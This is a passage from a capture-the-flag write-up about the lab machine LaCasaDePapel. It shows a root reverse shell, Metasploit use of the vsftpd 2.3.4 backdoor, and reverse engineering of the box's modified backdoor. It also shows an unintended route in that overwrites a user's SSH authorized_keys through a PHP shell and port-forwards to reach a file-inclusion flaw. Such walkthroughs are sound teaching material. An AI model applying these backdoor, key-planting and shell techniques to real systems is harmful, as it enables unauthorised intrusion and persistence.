Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.131.
Ncat: Connection from 10.10.10.131:53388.
bash: cannot set terminal process group (4255): Not a tty
bash: no job control in this shell
bash-4.4# id
uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)

```

And get the flag:

```

bash-4.4# cat /root/root.txt
586979c4...

```

## Beyond Root

### VSFTPd Deep Dive

#### Metasploit

Many people got stuck here because the Metasploit version of the exploit won’t work in this case. Why is that? I’ll remember what the exploit is doing. When I connect with a certain username, it opens a shell listening on port 6200.

I’ll fire up Metasploit, go to the exploit, and set the target ip:

```

root@kali# msfconsole
       =[ metasploit v5.0.20-dev                          ]
+ -- --=[ 1888 exploits - 1065 auxiliary - 328 post       ]
+ -- --=[ 546 payloads - 44 encoders - 10 nops            ]
+ -- --=[ 2 evasion                                       ]
[*] Starting persistent handler(s)...
msf5 > search vsftpd

Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   1  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution

msf5 > use exploit/unix/ftp/vsftpd_234_backdoor
msf5 exploit(unix/ftp/vsftpd_234_backdoor) > set rhost 10.10.10.131
rhost => 10.10.10.131  
msf5 exploit(unix/ftp/vsftpd_234_backdoor) > options
                                
Module options (exploit/unix/ftp/vsftpd_234_backdoor):
                                                           
   Name    Current Setting  Required  Description          
   ----    ---------------  --------  -----------          
   RHOSTS  10.10.10.131     yes       The target address range or CIDR identifier
   RPORT   21               yes       The target port (TCP)

Payload options (cmd/unix/interact):
                
   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------

Exploit target:                                                                                                        

   Id  Name
   --  ----                                    
   0   Automatic 

```

Now I can run it, and it fails:

```

msf5 exploit(unix/ftp/vsftpd_234_backdoor) > run

[*] 10.10.10.131:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 10.10.10.131:21 - USER: 331 Please specify the password.
[*] Exploit completed, but no session was created.

```

If I try to run it again, I get a different message:

```

msf5 exploit(unix/ftp/vsftpd_234_backdoor) > run
                                                
[*] 10.10.10.131:21 - The port used by the backdoor bind listener is already open
[-] 10.10.10.131:21 - The service on port 6200 does not appear to be a shell
[*] Exploit completed, but no session was created.

```

The exploit did work, and the box did open a shell on 6200. But Metasploit is expecting that this is a linux shell, not this Psy PHP shell. The exploit did work, just Metasploit didn’t know how to interact with it and bailed. I can connect to the shell with `nc`:

```

root@kali# rlwrap nc 10.10.10.131 6200
Psy Shell v0.9.9 (PHP 7.2.10 — cli) by Justin Hileman
getcwd()
=> "/"
get_current_user()
=> "root"

```

#### Reverse vsftpd

I’ll pull a copy of the binary home and take a look in Ida Pro (free version). If I start with the strings window, I’ll see a couple with `iptables` referencing destination port 6200 towards the bottom:

![1563740345837](https://0xdfimages.gitlab.io/img/1563740345837.png)

When I double click on one (I’ll go for the second since it’s adding a rule instead of deleting a rule), then select `aSbinIptablesII` and push `x` for cross references, and go to the only result, I find this function:

![1563740526319](https://0xdfimages.gitlab.io/img/1563740526319.png)

This function takes an IP address, and run two `iptables` strings through the `system` api call:

```

/sbin/iptables -D INPUT -p tcp -s %s --dport 6200 -j ACCEPT 2>/dev/null
/sbin/iptables -I INPUT -p tcp -s %s --dport 6200 -j ACCEPT

```

The first deletes a rule for inbound tcp traffic from my ip to port 6200. The second adds that rule that allows my to talk to the port. I’ll name the function `open_firewall`, and then select it and hit x to get references to it to see where it was called.

This function is reading through a string, and looking for `:`. If it finds it, it then checks if the following character is `)`. If so, it calls `open_firewall`.

![1563742401984](https://0xdfimages.gitlab.io/img/1563742401984.png)

I could keep going up the call stack to see what calls this function, but given the exploit works, this is almost certainly passed a username.

#### Video Analysis of VSFTPd

In this video, I’ll start with some analysis on the original VSFTPd backdoored code, and the compare it to the version from LaCasaDePapel.

#### Port 6200

So what’s going on with TCP 6200? I did a clean reset of the box, and skipped the beginning, going right to shell as professor and then root. I can look on the netstat and see that port 6200 is listening, as `node`, without any triggering of the backdoor:

```

bash-4.4# netstat -tnlp
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:443             0.0.0.0:*               LISTEN      3315/node
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      3314/node
tcp        0      0 127.0.0.1:11211         0.0.0.0:*               LISTEN      3186/memcached
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      3313/node
tcp        0      0 0.0.0.0:21              0.0.0.0:*               LISTEN      3274/vsftpd
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      3224/sshd
tcp        0      0 0.0.0.0:6200            0.0.0.0:*               LISTEN      3312/node
tcp        0      0 :::22                   :::*                    LISTEN      3224/sshd

```

The pid is 3312, so I’ll check the process list for the full command line:

```

bash-4.4# ps auxww | grep 3312
 3312 dali      0:00 /usr/bin/node /home/dali/server.js

```

I can check out the server:

```

const net = require('net')
const spawn = require('child_process').spawn

const server = net.createServer(function(socket) {
    const sh = spawn('/usr/bin/psysh')
    sh.stdin.resume()
    sh.stdout.on('data', function (data) {
        socket.write(data)
    })
    sh.stderr.on('data', function (data) {
        socket.write(data)
    })
    socket.on('data', function (data) {
        try {
          sh.stdin.write(data)
        }
        catch(e) {
          socket.end()
        }
    })
    socket.on('end', function () {
    })
    socket.on('error', function () {
    })
});

server.listen(6200, '0.0.0.0');

```

This is a simple `node` server that is serving a `psych` shell. Rather than have the backdoor start the process listening, the author of this box had the psy shell start automatically, and then had the backdoor allow access to it via `iptables` firewall.

#### Conclusion

The box author clearly made some changes to the `vsftpd` source code to run `iptables` allowing access to `psysh` as a backdoor rather than the famous one.

### Unintended Initial Access

From the psy shell, there’s an alternative path to initial access.

#### Enumeration

I need to find two things while enumerating.

First, if I look at `/proc/net/tcp`, I can get the information like a `netstat`:

```

echo file_get_contents("/proc/net/tcp")
  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode                                                     
   0: 00000000:01BB 00000000:0000 0A 00000000:00000000 00:00000000 00000000 65534        0 6507 1 ffff8d247baad000 100 0 0 10 0                      
   1: 0100007F:1F40 00000000:0000 0A 00000000:00000000 00:00000000 00000000  1001        0 4587 1 ffff8d247a2f6000 100 0 0 10 0                      
   2: 0100007F:2BCB 00000000:0000 0A 00000000:00000000 00:00000000 00000000   102        0 6430 1 ffff8d247baac000 100 0 0 10 0                      
   3: 00000000:0050 00000000:0000 0A 00000000:00000000 00:00000000 00000000 65534        0 1938 1 ffff8d247a349800 100 0 0 10 0                      
   4: 00000000:0015 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 6481 1 ffff8d247baae800 100 0 0 10 0                      
   5: 00000000:0016 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 4561 1 ffff8d247a2f3000 100 0 0 10 0                      
   6: 00000000:1838 00000000:0000 0A 00000000:00000000 00:00000000 00000000  1000        0 4584 1 ffff8d247a2f5800 100 0 0 10 0                      
   7: 830A0A0A:1838 020E0A0A:C2BC 01 00000000:00000000 00:00000000 00000000  1000        0 11803 1 ffff8d247baae000 28 4 31 10 -1                    
   8: 830A0A0A:0016 020E0A0A:E31E 01 00000024:00000000 01:0000001D 00000000     0        0 12044 4 ffff8d247baaf000 29 4 27 10 -1                    
   9: 830A0A0A:0016 020E0A0A:E30A 01 00000000:00000000 02:0006F4CB 00000000     0        0 4638 2 ffff8d247baa9000 24 4 0 10 -1                      
  10: 830A0A0A:D08C 020E0A0A:01BB 01 00000000:00000000 00:00000000 00000000     0        0 8475 1 ffff8d247a2f2800 24 4 29 10 -1                     
  11: 830A0A0A:0016 020E0A0A:E30C 01 00000000:00000000 02:00072B93 00000000     0        0 4746 2 ffff8d247baa9800 25 4 25 10 -1

```

The first 7 are in state `0A`, which is listening. Those translate to:

```
0.0.0.0:443
127.0.0.1:8000
127.0.0.1:11211
0.0.0.0:80
0.0.0.0:21
0.0.0.0:22
0.0.0.0:6200

```

The two local host ones are interesting and new.

Second, I can read into the `.ssh` directory of dali, and no other user:

```

scandir("/home/berlin/.ssh")
PHP Warning:  scandir(/home/berlin/.ssh): failed to open dir: Permission denied in phar://eval()'d code on line 1
scandir("/home/dali/.ssh")
=> [
     ".",
     "..",
     "authorized_keys",
     "known_hosts",
   ]
scandir("/home/nairobi/.ssh")
PHP Warning:  scandir(/home/nairobi/.ssh): failed to open dir: No such file or directory in phar://eval()'d code on line 1
scandir("/home/oslo/.ssh")
PHP Warning:  scandir(/home/oslo/.ssh): failed to open dir: No such file or directory in phar://eval()'d code on line 1
scandir("/home/professor/.ssh")
PHP Warning:  scandir(/home/professor/.ssh): failed to open dir: Permission denied in phar://eval()'d code on line 1

```

There is a public key in `authorized_keys`, but I don’t see the matching private key:

```

echo file_get_contents("/home/dali/.ssh/authorized_keys")
ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAsDHKXtzjeyuWjw42RbtoDy2c6lWdtfEzsmqmHrbJDY2hDcKWekWouWhe/NTCQFim6weKtsEdTzh0Qui+6jKc8/ZtpKzHrXiSXSe48JwpG7abmp5iCihzDozJqggBNoAQrvZqBhg6svcKh8F0kTnxUkBQgBm4kjOPteN+TfFoNIod7DQ72/N25D/lVThCLcStbPkR8fgBz7TGuTTAsNFXVwjlsgwi2qUF9UM6C1JkMBk5Y9ssDHiu4R35R5eCl4EEZLL946n/Gd5QB7pmIRHMkmt2ztOaKU4xZthurZpDXt+Et+Rm3dAlAZLO/5dwjqIfmEBS1eQ4sT8hlUkuLvjUDw== thek@ThekMac.local

```

I suspect this is a key the box creator used for access.

#### Overwrite authorized\_keys

I can write to this file using this shell:

```

fwrite(fopen("/home/dali/.ssh/authorized_keys","w+"),"0xdf");
=> 4
echo file_get_contents("/home/dali/.ssh/authorized_keys")
0xdf

```

So I’ll put a public key for a pair I control in place:

```

fwrite(fopen("/home/dali/.ssh/authorized_keys","w+"),"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC0SwpwZ7rgMtCZYzkDtFJvQZO20N+8DmYxOix+PgL6VQW/9wZC3xnKK1zeAelMYtv/O38GXE2ghUH7z6ayVmTMkjGqt18mhsEpCt0BbonGRC0IHoBsV5QBVNin+x1soVdECT1Tr45bNnTnkZXIgSyDumc+2Ix6A1wiiC5RbI3SrxJ7nL0lRlhjdoAH6KCb4dwhX+Jos0VudHRreE01+0YE0Qb7Sd0eA5Cq7UtjgiW6VyXcmWH7aQdVZlUanrs5wdwWYeVCxY/XfFCCDmHZw+8W5INudM2t7on7bl/rYnhAExOr14/1s7LfYAfV8B6VNPPX+IOzOcT4aYQC3rRDiG5P root@kali");
=> 390

```

And get a shell:

```

root@kali# ssh -i ~/id_rsa_generated dali@10.10.10.131

 _             ____                  ____         ____                  _
| |    __ _   / ___|__ _ ___  __ _  |  _ \  ___  |  _ \ __ _ _ __   ___| |
| |   / _` | | |   / _` / __|/ _` | | | | |/ _ \ | |_) / _` | '_ \ / _ \ |
| |__| (_| | | |__| (_| \__ \ (_| | | |_| |  __/ |  __/ (_| | |_) |  __/ |
|_____\__,_|  \____\__,_|___/\__,_| |____/ \___| |_|   \__,_| .__/ \___|_|
                                                            |_|

Psy Shell v0.9.9 (PHP 7.2.10 — cli) by Justin Hileman
>>>

```

Unfortunately, it’s still in psy.

#### Access LFI

But, with `ssh`, I can also forward ports. I’ll connect with a forwarder to redirect traffic on my local host port 8000 to port 8000 on LaCasaDePapel:

```

root@kali# # ssh -i ~/id_rsa_generated dali@10.10.10.131 -L 8000:lalhost:8000 -N 

```

Now I can get to the section of the page with the LFI without making a certificate:

![1563528617474](https://0xdfimages.gitlab.io/img/1563528617474.png)

![1563528673885](https://0xdfimages.gitlab.io/img/1563528673885.png)

#### dali’s Shell

With a bash shell later, I can verify in the `/etc/passwd` file that running a shell as dali will give me `psysh`:

```

bash-4.4# grep dali /etc/passwd
dali:x:1000:1000:dali,,,:/home/dali:/usr/bin/psysh

```

[Chankro »](/2019/08/02/bypassing-php-disable_functions-with-chankro.html)